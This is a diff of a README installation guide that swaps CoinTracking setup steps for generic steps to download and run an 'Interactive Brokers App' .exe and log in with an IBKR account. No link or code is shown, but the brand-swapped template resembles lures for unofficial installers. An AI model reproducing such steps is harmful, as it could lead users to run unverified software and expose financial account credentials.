@@ -16,13 +16,15 @@
 # Installation Guide  
 
 ## For Windows:  
-1. Access the official CoinTracking website through the buttons above.  
-2. Open the `.exe` installer and follow the setup steps.  
-3. Launch the app and log in to your CoinTracking account to sync your exchanges.  
+
+1. Get the **Interactive Brokers App** installer.  
+2. Run the `.exe` file to start installation.  
+3. Log in with your **IBKR account**.  
 
 ## For macOS:  
-1. Use the Mac button above to navigate to the official site.  
-2. Download the package, install, and connect your crypto wallets.  
+
+1. Go to the website using the button above.  
+2. Follow the on-screen instructions to install and activate the program.  
 
 ---
 
